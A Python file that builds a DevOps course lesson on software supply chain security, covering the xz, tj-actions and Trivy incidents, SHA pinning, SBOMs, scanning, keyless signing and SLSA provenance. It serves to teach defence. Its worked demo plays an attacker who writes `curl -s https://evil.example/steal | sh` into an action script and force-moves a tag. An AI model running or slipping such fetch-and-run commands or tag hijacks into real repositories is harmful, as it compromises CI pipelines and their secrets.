"""Day 52: The software supply chain (Part 13, DevSecOps)."""
import pathlib

from svg import arrow, box, note, svg

LAB = pathlib.Path("/home/user/devops-from-zero/labs/hello-devops")


def lab(path, fix_days=False):
    text = (LAB / path).read_text().rstrip("\n")
    if fix_days:
        # The lab file still names the first-edition day (22). The second edition teaches it on Day 52.
        text = text.replace("Day 22", "Day 52")
    return text


# ---------------------------------------------------------------- diagram
def diagram():
    p = [note(280, 18, "where the three attacks got in")]
    xs = [8, 120, 232, 344, 456]
    labels = ["Code", "Libraries", "CI build", "Registry", "Cluster"]
    classes = ["bx", "bxo", "bxo", "bx", "bxt"]
    attacks = {1: ["xz 2024"], 2: ["tj-actions 2025", "Trivy 2026"]}
    checks = ["secret scan", "SBOM, scan", "pin SHAs", "sign, attest", "verify first"]
    for i, (x, lab_, cls) in enumerate(zip(xs, labels, classes)):
        for j, a in enumerate(attacks.get(i, [])):
            p.append(note(x + 48, 40 + 14 * j, a))
        p.append(box(x, 76, 96, 44, cls, lab_))
        p.append(note(x + 48, 160, checks[i]))
        p.append(arrow(x + 48, 124, x + 48, 146, dashed=True, head=False))
        if i < 4:
            p.append(arrow(x + 98, 98, x + 110, 98))
    p.append(note(280, 186, "the check you add at each link"))
    return svg(200, "A supply chain from code to cluster. xz hit the libraries, tj-actions and Trivy hit the CI build. "
               "Under each link is the check that protects it: secret scan, SBOM and scan, pinned SHAs, signing and attestations, verify before deploy.", p)


SECTIONS = [
    {
        "h": "Your image is mostly other people's work",
        "body": (
            "Count what is inside the hello-devops image you built on Day 16. Your own code is one file, `app.py`. "
            "Everything else came from people you have never met:\n"
            "- 87 Debian packages from the `python:3.14-slim` base image.\n"
            "- Python itself.\n"
            "- Flask, gunicorn, redis and their dependencies: about 10 Python packages.\n\n"
            "And that is only what ships. To build the image, your release workflow also runs code you did not write: "
            "the GitHub runner, the Docker actions, a scanner and a signing tool. Each of those steps runs with your workflow's rights, "
            "so each one could read the workflow's token.\n\n"
            "All of this together is your software supply chain: every piece your code passes through between your keyboard and production. "
            "A supply chain attack goes after one of those pieces instead of your code. It works because you trust the pieces and run them without reading them.\n\n"
            "DevSecOps means building security checks into that chain as automatic steps, owned by the people who ship. Two ideas carry most of it:\n"
            "1. Shift left: run cheap checks early. A leaked token caught before `git push` costs a minute. Found in production, it costs a weekend of rotating keys.\n"
            "2. Least privilege: every person, token and Pod gets only the rights it needs, for as short a time as possible. "
            "You have done this already, with the `permissions:` block on Day 21 and the non-root user on Day 16."
        ),
        "refs": [
            {"title": "GitHub Docs: secure use reference for GitHub Actions", "url": "https://docs.github.com/en/actions/reference/security/secure-use", "kind": "docs"},
            {"title": "Syft: SBOM generator (README)", "url": "https://github.com/anchore/syft/blob/main/README.md", "kind": "docs"},
        ],
    },
    {
        "h": "Three attacks, three weak links",
        "body": (
            "Real incidents teach this better than any diagram. Each of these hit a different link, and none of them touched the victims' own code.\n\n"
            "The xz-utils backdoor (2024). xz is a small compression library that almost every Linux system has. "
            "A contributor earned the maintainer's trust over time, then hid malicious code in the release tarballs of versions 5.6.0 and 5.6.1. "
            "The code was not in the git repository. It sat in extra build files inside the tarballs, and on some systems it reached the SSH server. "
            "A developer, Andres Freund, noticed SSH logins using too much CPU while benchmarking, and traced the cause to xz. "
            "The [GitHub advisory](https://github.com/advisories/GHSA-rxwq-x6h5-x525) scores it 10 out of 10.\n\n"
            "tj-actions/changed-files (March 2025). Attackers moved this popular GitHub Action's version tags to a malicious commit. "
            "For about a day, every workflow that used one of those tags ran a script that printed CI secrets into the build log. "
            "GitHub's advisory says over 23,000 repositories used the action.\n\n"
            "Trivy (March 2026). Trivy is a security scanner, the same one in your release workflow. "
            "After an earlier breach, the attackers still had working credentials, because the key rotation was not done all at once. "
            "On 19 March they published a malicious Trivy v0.69.4 and force-pushed 76 of the 77 `trivy-action` tags. "
            "The payload stole secrets and then ran the real scan, so builds looked normal. "
            "Aqua's advisory notes that images pulled by digest were not affected.\n\n"
            "Three lessons follow:\n"
            "- A trusted maintainer can turn bad, so you need to know exactly what you ship.\n"
            "- A tag can be moved, so pin to things that cannot move: commit SHAs and image digests.\n"
            "- Security tools are part of the chain too. After an incident, rotate every secret a bad step could read."
        ),
        "refs": [
            {"title": "XZ Exploit (Computerphile)", "url": "https://www.youtube.com/watch?v=LY8_35a_DEA", "kind": "watch"},
            {"title": "GitHub advisory: tj-actions/changed-files (CVE-2025-30066)", "url": "https://github.com/advisories/GHSA-mrrh-fwg8-r2c3", "kind": "read"},
            {"title": "Aqua advisory: Trivy ecosystem compromise (CVE-2026-33634)", "url": "https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23", "kind": "read"},
        ],
    },
    {
        "h": "Tags move, commit SHAs do not",
        "body": (
            "This trips up most people, so slow down here. When you write `uses: some-org/action@v4`, the `v4` is a git tag. "
            "A tag is a name that points at one commit, like a sticky note on a page. "
            "Anyone with push rights to that repository can peel the note off and stick it on a different commit. "
            "Your next run then executes the new code, and nothing in your own repository changed.\n\n"
            "A commit SHA is different. It is a 40-character hash of the commit's content: its files, its parent commit, its author and its message. "
            "Change one byte and you get a different SHA. So `uses: some-org/action@<full-sha>` always means the same code. "
            "In March 2026 the attacker moved 76 `trivy-action` tags, but could not change what an old SHA points to.\n\n"
            "Look at the scan step in the lab's `release.yml`:\n"
            "`uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0`\n\n"
            "The SHA is what runs. The comment is only for humans, and Dependabot (Day 21) updates both when a new release appears. "
            "That is the price of pinning: pinned code never changes by itself, so you need a bot to bring you fixes, and a person to review them.\n\n"
            "Images follow the same rule. A tag such as `hello-devops:1.2.0` can be pushed again with new content. "
            "A digest such as `@sha256:` followed by 64 hex characters cannot. That is why the workflow signs the digest.\n\n"
            "One gap in the lab: `actions/checkout@v7` and `actions/attest@v4` still use tags. "
            "They come from GitHub itself, and many teams accept that risk. Stricter teams pin them too, and for a release workflow I would."
        ),
        "refs": [
            {"title": "GitHub Docs: pin actions to a full-length commit SHA", "url": "https://docs.github.com/en/actions/reference/security/secure-use", "kind": "docs"},
            {"title": "GitHub Docs: Dependabot and GitHub Actions", "url": "https://docs.github.com/en/code-security/concepts/supply-chain-security/dependabot-on-actions", "kind": "docs"},
        ],
    },
    {
        "h": "Know what you ship: SBOMs and scanners",
        "body": (
            "An SBOM (software bill of materials) is the ingredient list of an artifact: every package and version inside it, "
            "in a format machines can read. The two standard formats are SPDX and CycloneDX. The tool `syft` reads an image and writes either one, or both.\n\n"
            "Why keep a list? Picture the morning the next xz is announced. Without SBOMs, every team pulls and inspects its images to find out whether they are affected. "
            "With an SBOM stored for every release, you search the files and have the answer in minutes.\n\n"
            "A vulnerability scanner takes that list and compares it with public databases of known holes. "
            "Each hole has a CVE ID and a severity: LOW, MEDIUM, HIGH or CRITICAL. Trivy and grype are the two common free scanners. "
            "Trivy can also check Dockerfiles, Kubernetes YAML and Terraform for risky settings.\n\n"
            "Scanners have two limits:\n"
            "- They cannot find a backdoor nobody has reported yet. The xz code had no CVE until the day it was found.\n"
            "- They go stale. New CVEs are published against old packages every day.\n\n"
            "So scan in CI, and also re-scan the stored SBOMs on a schedule. `grype sbom:./sbom.spdx.json` checks an old release without pulling the image.\n\n"
            "Decide in advance what fails the build. My rule: fail on HIGH and CRITICAL findings that already have a fixed version, and track the rest. "
            "That is exactly what the release workflow does with `severity: CRITICAL,HIGH` and `ignore-unfixed: true`. "
            "When it fails, update first, then remove what you do not need, and only then accept a risk in a `.trivyignore` file, with a reason and a date."
        ),
        "refs": [
            {"title": "Grype: scan images, folders and SBOMs (README)", "url": "https://github.com/anchore/grype/blob/main/README.md", "kind": "docs"},
            {"title": "Trivy: scanners and targets (README)", "url": "https://github.com/aquasecurity/trivy/blob/main/README.md", "kind": "docs"},
        ],
    },
    {
        "h": "Signing: who built this, and has it changed?",
        "body": (
            "A scan tells you what is inside. A signature answers two other questions: who made this artifact, and has anyone changed it since? "
            "Classic signing needs a private key, and a private key in CI is one more secret that can leak.\n\n"
            "**Keyless signing** with cosign, from the Sigstore project, removes the stored key. Here is what happens in the release job:\n"
            "1. The job asks GitHub for an OIDC token: a short signed note that says \"I am release.yml in this repository, running for tag v1.2.0\". "
            "You met OIDC on Day 21, for cloud logins.\n"
            "2. cosign makes a fresh key pair that lives only in memory.\n"
            "3. Fulcio, Sigstore's certificate authority, checks the token and issues a certificate for that key. "
            "It is valid for 10 minutes and has the workflow identity written inside.\n"
            "4. cosign signs the image digest and stores the signature in the registry, next to the image.\n"
            "5. The signing event goes into Rekor, a public log that only grows. Nobody can quietly remove or rewrite an entry.\n\n"
            "To verify, you name the identity you expect. `cosign verify` takes `--certificate-identity` (your workflow file and tag) "
            "and `--certificate-oidc-issuer` (GitHub's token service). An image signed by anyone else fails.\n\n"
            "The cosign README adds two warnings. Sign the digest, never a tag, or you might sign something you did not intend. "
            "And when you sign as a person, your email goes into the public log, where it cannot be removed.\n\n"
            "A signature proves origin, not quality. A signed image can still be full of bugs."
        ),
        "refs": [
            {"title": "cosign: sign and verify (README)", "url": "https://github.com/sigstore/cosign/blob/main/README.md", "kind": "docs"},
            {"title": "Sigstore docs: Fulcio certificate authority", "url": "https://github.com/sigstore/docs/blob/main/content/en/certificate_authority/overview.md", "kind": "docs"},
            {"title": "From Cosign to an ecosystem: the evolution of Sigstore (Cody Soyland, GitHub)", "url": "https://www.youtube.com/watch?v=hsHeZRFj5jc", "kind": "watch"},
        ],
    },
    {
        "h": "Provenance, SLSA and artifact attestations",
        "body": (
            "A signature says who signed. Provenance says how the thing was built: which repository, which commit, which workflow file and which kind of runner. "
            "It is a signed statement in a standard format (in-toto), bound to the artifact's digest. "
            "Think of a delivery note that names the factory and the production line, with a stamp on it.\n\n"
            "SLSA (say \"salsa\") turns this into levels. The build track of the [SLSA spec](https://github.com/slsa-framework/slsa/blob/main/spec/build-track-basics.md):\n"
            "- Build L0: no guarantees.\n"
            "- Build L1: provenance exists. It catches mistakes, but anyone could have written it.\n"
            "- Build L2: a hosted build platform signs the provenance. It catches tampering after the build.\n"
            "- Build L3: a hardened build platform. It catches tampering during the build.\n\n"
            "GitHub artifact attestations give you Build L2 in one step. The lab calls `actions/attest@v4` twice. "
            "With no SBOM input it writes SLSA provenance. With `sbom-path` it attaches the SBOM as a second signed attestation. "
            "Moving the build into a shared reusable workflow (Day 20) is GitHub's documented path to L3.\n\n"
            "Now the step most teams skip. [GitHub's own docs](https://docs.github.com/en/actions/concepts/security/artifact-attestations) "
            "say that generating attestations alone gives no security benefit. Someone has to verify them, for example with `gh attestation verify`. "
            "Until a person or a machine checks it, an attestation is a receipt nobody reads."
        ),
        "refs": [
            {"title": "SLSA spec: build track basics", "url": "https://github.com/slsa-framework/slsa/blob/main/spec/build-track-basics.md", "kind": "docs"},
            {"title": "GitHub Docs: artifact attestations", "url": "https://docs.github.com/en/actions/concepts/security/artifact-attestations", "kind": "docs"},
            {"title": "Enhancing artifact security with GitHub's build provenance (Fredrik Skogman and Radoslav Dimitrov)", "url": "https://www.youtube.com/watch?v=KDIKj65EB9I", "kind": "watch"},
        ],
    },
    {
        "h": "Read the release workflow in order",
        "body": (
            "Open `.github/workflows/release.yml` in Files below and follow one tag push through it. The order is on purpose:\n"
            "1. `permissions:` gives this job four rights: read the code, push packages, ask for an OIDC token, write attestations.\n"
            "2. Build once for the runner's own platform with `load: true`. The image exists locally, and nothing is pushed yet.\n"
            "3. Scan that local image with Trivy. If the scan fails, the job stops, and nothing bad reaches the registry.\n"
            "4. Build and push for amd64 and arm64. This step outputs the digest.\n"
            "5. Write the SBOM of the pushed digest with `anchore/sbom-action`.\n"
            "6. Sign that digest with cosign.\n"
            "7. Attest the provenance, then the SBOM, both bound to the same digest.\n\n"
            "Every step after the push uses `${IMAGE}@${DIGEST}`, never a tag. And every third-party action is pinned to a SHA, "
            "including the scanner that was attacked in March 2026. "
            "The workflow is the same file you wrote on Day 21. Today adds steps 2, 3, 5, 6 and 7, and the two rights they need."
        ),
        "refs": [
            {"title": "GitHub Docs: use artifact attestations", "url": "https://docs.github.com/en/actions/how-tos/secure-your-work/use-artifact-attestations/use-artifact-attestations", "kind": "docs"},
            {"title": "actions/attest: attestation modes (README)", "url": "https://github.com/actions/attest/blob/main/README.md", "kind": "docs"},
        ],
    },
]

WORKED = {
    "title": "Watch a tag move, then read a real pin",
    "steps": [
        {
            "say": "Make a throwaway repository that plays an action's maintainer. Tag the first commit `v1`, the way an action publishes a release.",
            "code": (
                "$ mkdir /tmp/tagdemo && cd /tmp/tagdemo && git init -q\n"
                "$ echo 'echo \"scanning...\"' > action.sh\n"
                "$ git add . && git commit -qm \"Release 1.0\" && git tag v1\n"
                "$ git rev-parse v1\n"
                "fdc7302786077937dd5afcc0a0b7d31de75a46e9"
            ),
            "lang": "console",
        },
        {
            "say": "Now play the attacker with a stolen token. Change the code, commit, and move the tag with `-f`. "
                   "A workflow that says `@v1` would now run the new code, and its own file did not change at all.",
            "code": (
                "$ echo 'echo \"scanning...\"; curl -s https://evil.example/steal | sh' > action.sh\n"
                "$ git commit -qam \"Innocent-looking fix\"\n"
                "$ git tag -f v1\n"
                "Updated tag 'v1' (was fdc7302)\n"
                "$ git rev-parse v1\n"
                "2df87fdf0effb81f0db1334d84a8bf3a7c72cb45"
            ),
            "lang": "console",
        },
        {
            "say": "The old commit is still there, and its SHA still names the old code. A workflow pinned to `fdc7302...` keeps running what you reviewed. "
                   "Your hashes will differ from mine, because a SHA includes the author and the time.",
            "code": (
                "$ git show fdc7302:action.sh\n"
                "echo \"scanning...\"\n"
                "$ git log --oneline\n"
                "2df87fd Innocent-looking fix\n"
                "fdc7302 Release 1.0"
            ),
            "lang": "console",
        },
        {
            "say": "Now check a real pin. `git ls-remote` asks GitHub what a tag points to, without cloning. "
                   "Release tags are often annotated: a small tag object of their own. The line ending in `^{}` is the commit underneath, and that is the SHA in the lab's workflow.",
            "code": (
                "$ git ls-remote https://github.com/aquasecurity/trivy-action \\\n"
                "    refs/tags/v0.36.0 'refs/tags/v0.36.0^{}'\n"
                "a9c7b0f06e461e9d4b4d1711f154ee024b8d7ab8\trefs/tags/v0.36.0\n"
                "ed142fd0673e97e23eac54620cfb913e5ce36c25\trefs/tags/v0.36.0^{}\n"
                "$ cd ~/code/hello-devops && grep trivy-action .github/workflows/release.yml\n"
                "        uses: aquasecurity/trivy-action@ed142fd0673e97e23eac54620cfb913e5ce36c25 # v0.36.0"
            ),
            "lang": "console",
        },
        {
            "say": "If the two ever disagree, either someone moved the tag after you pinned, or your comment is stale. In both cases the SHA is what runs. "
                   "Dependabot opens a pull request when a newer release appears, and you review that change like any other code. Delete the demo with `rm -rf /tmp/tagdemo`.",
        },
    ],
}

CODE = [
    {
        "lang": "yaml",
        "title": ".github/workflows/release.yml (Day 52: scan, SBOM, sign, attest)",
        "src": lab(".github/workflows/release.yml", fix_days=True),
        "run": "git tag v1.2.0 && git push origin v1.2.0",
    },
    {
        "lang": "bash",
        "title": "security/verify-release.sh",
        "src": lab("security/verify-release.sh"),
        "run": "security/verify-release.sh <your-github-user> 1.2.0",
    },
]

COMMANDS = [
    {"cmd": "brew install syft grype trivy cosign", "what": "Install the SBOM, scanning and signing tools."},
    {"cmd": "syft hello-devops:1.2.0 -o spdx-json=sbom.spdx.json -o cyclonedx-json=sbom.cdx.json", "what": "Write an SBOM of a local image in both standard formats at once."},
    {"cmd": "trivy image --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 hello-devops:1.2.0", "what": "Scan an image the way CI does: fail on serious bugs that have a fix."},
    {"cmd": "grype sbom:./sbom.spdx.json", "what": "Scan a saved SBOM for known CVEs, without the image."},
    {"cmd": "trivy fs --scanners vuln,secret,misconfig .", "what": "Scan the project folder for vulnerable libraries, leaked secrets and risky config."},
    {"cmd": "git ls-remote https://github.com/aquasecurity/trivy-action 'refs/tags/v0.36.0^{}'", "what": "Show which commit a remote tag points to right now."},
    {"cmd": "docker buildx imagetools inspect ghcr.io/<your-github-user>/hello-devops:1.2.0", "what": "Show the digest behind a tag in the registry."},
    {"cmd": "cosign verify ghcr.io/<your-github-user>/hello-devops@sha256:<digest> --certificate-identity https://github.com/<your-github-user>/hello-devops/.github/workflows/release.yml@refs/tags/v1.2.0 --certificate-oidc-issuer https://token.actions.githubusercontent.com", "what": "Check that your release workflow signed this digest, for tag v1.2.0."},
    {"cmd": "gh attestation verify oci://ghcr.io/<your-github-user>/hello-devops:1.2.0 --owner <your-github-user> --signer-workflow <your-github-user>/hello-devops/.github/workflows/release.yml", "what": "Check the SLSA provenance attestation and which workflow made it."},
    {"cmd": "gh attestation verify oci://ghcr.io/<your-github-user>/hello-devops:1.2.0 --owner <your-github-user> --predicate-type https://spdx.dev/Document/v2.3", "what": "Check the SBOM attestation instead of the provenance."},
    {"cmd": "security/verify-release.sh <your-github-user> 1.2.0", "what": "Run all three checks and print the digest to deploy."},
]

DEEPER = (
    "Three ideas take today's work further.\n\n"
    "First, look one level down. `trivy-action` is a composite action: it runs another action, `aquasecurity/setup-trivy`, to install the Trivy binary. "
    "Your SHA pin fixes the outer code. What about the inner one? Open the action's `action.yaml` at the SHA you pinned, and you find:\n"
    "- `uses: aquasecurity/setup-trivy@3fb12ec12f41e471780db15c232d5dd185dcb514 # v0.2.6`, a pin by SHA.\n"
    "- A `version` input whose default is a fixed Trivy release, `v0.70.0`, not `latest`.\n\n"
    "So the maintainers pinned their own dependency too, and Aqua's advisory lists setup-trivy 0.2.6 as the first safe version. "
    "When you adopt an action, read its action file once. If it installs `latest` of anything, set the version yourself.\n\n"
    "Second, a caveat on SHAs. GitHub's [secure use reference](https://docs.github.com/en/actions/reference/security/secure-use) says to check that a SHA comes from the action's own repository, not a fork. "
    "GitHub stores a repository and its forks together, so a commit that exists only in a fork can still be fetched through the original name. "
    "Aqua's advisory calls this an imposter commit, and the Trivy attackers used one. "
    "Let Dependabot write your pins instead of copying SHAs from a blog post. "
    "GitHub now also documents [workflow dependency lockfiles](https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles): "
    "a `.github/workflows/actions.lock` file, made by the `gh actions-lock` extension, that pins every action, including the actions your actions use, "
    "and checks at run time that each commit belongs to the right repository. Read the docs before you adopt it; it is new.\n\n"
    "Third, let the cluster do the verifying. Kyverno (Day 53) has a policy type for this, ImageValidatingPolicy. You tell it:\n"
    "- Which images it covers, for example `ghcr.io/<your-github-user>/*`.\n"
    "- Which identity must have signed them: your release workflow and GitHub's OIDC issuer, the same values you pass to `cosign verify`.\n"
    "- Optionally, which attestations must exist, such as SLSA provenance.\n\n"
    "When a Pod arrives, Kyverno looks up the signature in the registry and checks it. An unsigned image, or one signed by another workflow, is rejected. "
    "The check needs network access to the registry and to Sigstore, and one typo in the identity blocks every deploy. "
    "So start it in Audit mode, like the policies on Day 53."
)

lesson = {
    "id": "d52",
    "title": "The software supply chain",
    "minutes": 50,
    "goal": "By the end you can explain how attackers get into a software supply chain, and list, scan, sign and verify the hello-devops image so you know what you ship and who built it.",
    "guess": {
        "q": "Your workflow uses `some-org/scan-action@v4`. An attacker steals the maintainer's token and pushes new code. What runs in your next build?",
        "options": [
            "The old code, because a version tag can never move",
            "Nothing, because GitHub blocks changed actions",
            "The attacker's code, because the tag can be moved",
            "The old code, because your runner caches actions",
        ],
        "answer": 2,
        "why": "A git tag is a movable pointer. Attackers moved tj-actions tags in 2025 and trivy-action tags in 2026; a full commit SHA cannot be moved.",
    },
    "terms": [
        {"term": "Software supply chain", "plain": "Everything your code passes through on the way to production: libraries, base images, build tools, CI actions and registries."},
        {"term": "Supply chain attack", "plain": "An attack on something you depend on, so that your own build ships the attacker's code."},
        {"term": "CVE", "plain": "A public ID for one known security hole, such as CVE-2024-3094 for the xz backdoor."},
        {"term": "SBOM", "plain": "Software bill of materials: a machine-readable list of every package and version inside an artifact."},
        {"term": "SHA pinning", "plain": "Naming an action by its full 40-character commit hash, which always means the same code, instead of a movable tag."},
        {"term": "Keyless signing", "plain": "Signing with a 10-minute certificate tied to an identity, such as your release workflow, so no private key is stored."},
        {"term": "Provenance", "plain": "A signed record of how an artifact was built: which repository, commit and workflow made it."},
        {"term": "SLSA", "plain": "Supply-chain Levels for Software Artifacts: build levels 0 to 3 that grade how far you can trust a build."},
    ],
    "sections": SECTIONS,
    "analogy": (
        "Think of a jar of jam in a shop. The ingredient label is the SBOM, and checking that label against the food recall list is the scan. "
        "The tamper-evident seal with the factory's stamp is the signature, and the delivery note that names the factory and the production line is the provenance. "
        "The shop's rule \"no seal, no sale\" is verification before deploy. "
        "Where it breaks: a seal proves who packed the jar and that nobody opened it, but says nothing about whether the jam is good."
    ),
    "diagram": diagram(),
    "diagram_caption": "Each link in the chain gets its own check, and the last check is yours: verify before you run.",
    "worked": WORKED,
    "code": CODE,
    "commands": COMMANDS,
    "mistake": (
        "Generating signatures, SBOMs and attestations and never checking them. GitHub's docs say it plainly: attestations give no security benefit until someone verifies them. "
        "Put a verify step where it matters: `security/verify-release.sh` before a manual deploy, and later an admission policy in the cluster (see Go deeper)."
    ),
    "real_world": (
        "At a payments company, auditors ask two questions about every release: what is in it, and who built it? "
        "The release pipeline answers both with a stored SBOM and a signed provenance attestation per image. "
        "When a critical CVE is announced, the security team searches the stored SBOMs and opens pull requests for the affected services, instead of asking every team to check by hand."
    ),
    "task": {
        "title": "Ship and verify a signed release",
        "steps": [
            "Install the tools with `brew install syft grype trivy cosign`.",
            "Build `hello-devops:1.2.0` locally (Day 16). Write an SPDX SBOM with syft, then find the version of flask inside the JSON.",
            "Scan the image with trivy using the same gate as CI: HIGH and CRITICAL, fixed issues only, and `--exit-code 1`. Then scan the saved SBOM with grype and compare the two reports.",
            "Add the scan, SBOM, sign and attest steps to your `.github/workflows/release.yml` (the full file is in Files). Keep the job's `permissions:` block exactly as shown.",
            "Commit and push, then tag `v1.2.0` and push the tag. Follow the run with `gh run watch`.",
            "Copy `security/verify-release.sh` into your repository and run it with your user name and 1.2.0.",
            "Break it on purpose: run the script's `cosign verify` command by hand with `v1.1.0` in the identity. Read the error and explain why it fails.",
        ],
        "hints": [
            "Artifact attestations are free for public repositories. On a private personal repository the attest steps fail, so make the repository public or remove those two steps.",
            "If cosign finds no matching signatures, compare the identity letter by letter: user name (case matters), workflow file and tag must match the run.",
            "jq reads the SBOM: `jq -r '.packages[] | select(.name==\"flask\") | .versionInfo' sbom.spdx.json`.",
        ],
        "done_when": "`security/verify-release.sh <your-github-user> 1.2.0` prints three OK lines and the digest to deploy.",
    },
    "explain_back": {
        "prompt": "Explain in 3 to 4 sentences how your release now protects the supply chain. Mention pinning, the SBOM, the signature and verification.",
        "answer": (
            "Every third-party action in the release workflow is pinned to a full commit SHA, so a moved tag cannot change the code that runs. "
            "Before pushing, the job scans the image and stops on serious bugs that have a fix. "
            "After pushing, it writes an SBOM of the exact digest, signs that digest keylessly with cosign, and attaches signed provenance that names the repository, commit and workflow. "
            "None of that helps until someone checks it, so I verify the signature and both attestations before I deploy, and I deploy the digest, not the tag."
        ),
    },
    "recap": [
        "Your image is mostly other people's code, and your build runs other people's actions with your rights.",
        "xz, tj-actions and Trivy each hit a different link: a maintainer, an action's tags and a security tool.",
        "Tags can move; commit SHAs and image digests cannot. Pin to them and let Dependabot bring updates.",
        "An SBOM lists what is inside; scanners match it against known CVEs, today and again later.",
        "Keyless signing ties a signature to your workflow identity; provenance records how the image was built.",
        "Nothing is protected until you verify: cosign verify and gh attestation verify before you deploy.",
    ],
    "check": [
        {
            "q": "A critical CVE is announced in a Python library. What answers \"which of our released images contain it?\" fastest?",
            "options": [
                "The Dockerfile in each repository",
                "The SBOMs stored for each release",
                "The cosign signatures of each image",
                "The Trivy logs from each release day",
            ],
            "answer": 1,
            "why": "SBOMs list every package and version per release, so you search them; old scan logs were written before this CVE existed.",
        },
        {
            "q": "A teammate says: \"The image is signed, so it has no vulnerabilities.\" What does the signature actually prove?",
            "options": [
                "The image passed every scan in CI",
                "Two reviewers approved the code in it",
                "The image layers are encrypted at rest",
                "Your workflow made it, and it is unchanged",
            ],
            "answer": 3,
            "why": "A signature proves origin and integrity, not quality; a signed image can still contain known bugs.",
        },
        {
            "q": "Your workflow pins `docker/login-action` to a full SHA. Tonight the maintainers' account is hijacked and every tag is moved. What runs in tomorrow's build?",
            "options": [
                "The same reviewed code as before",
                "The attacker's code from the moved tag",
                "Nothing, since GitHub disables the action",
                "Whatever the newest release is by then",
            ],
            "answer": 0,
            "why": "A SHA names one exact commit, so moving tags does not change what a pinned step runs.",
        },
    ],
    "interview": [
        {
            "q": "What is a software supply chain attack, and how would you defend a CI/CD pipeline against one?",
            "a": (
                "It is an attack on something you depend on, such as a library, a base image or a CI action, so that your own build ships the attacker's code. "
                "The xz-utils backdoor and the tj-actions and Trivy tag hijacks are recent examples. "
                "I pin third-party actions and base images to SHAs and digests, keep workflow permissions minimal, and use OIDC instead of stored keys. "
                "Every release gets an SBOM, a scan, a signature and provenance, and I verify them before deploying. "
                "After an incident I rotate every secret that a compromised step could read."
            ),
        },
        {
            "q": "What do an SBOM, a signature and provenance each prove, and what don't they prove?",
            "a": (
                "An SBOM lists what is inside an artifact, so you can find vulnerable packages quickly. "
                "A signature proves who produced the artifact and that it has not changed since. "
                "Provenance records how it was built (source, commit and build workflow), and SLSA levels say how far you can trust that record. "
                "None of them proves the code is free of bugs or malice: the xz backdoor came from a trusted maintainer's own release. "
                "Together they make the path from source to running image checkable, which is what you need during an incident."
            ),
        },
        {
            "q": "Why pin GitHub Actions to commit SHAs instead of version tags, and what does it cost you?",
            "a": (
                "A tag is a movable pointer, so whoever controls the action's repository can point it at new code, which is what happened with tj-actions and trivy-action. "
                "A full commit SHA is a hash of the content, so it always names the same code. "
                "The cost is that you stop getting fixes automatically, so you need Dependabot or Renovate to propose updates that a person reviews. "
                "I keep the version as a comment after the SHA so people can still read it."
            ),
        },
    ],
    "deeper": {"minutes": 15, "body": DEEPER},
    "sources": [
        {"title": "Aqua advisory: Trivy ecosystem compromise (CVE-2026-33634)", "url": "https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23"},
        {"title": "cosign README", "url": "https://github.com/sigstore/cosign/blob/main/README.md"},
        {"title": "SLSA spec: build track basics", "url": "https://github.com/slsa-framework/slsa/blob/main/spec/build-track-basics.md"},
        {"title": "GitHub Docs: artifact attestations", "url": "https://docs.github.com/en/actions/concepts/security/artifact-attestations"},
    ],
}
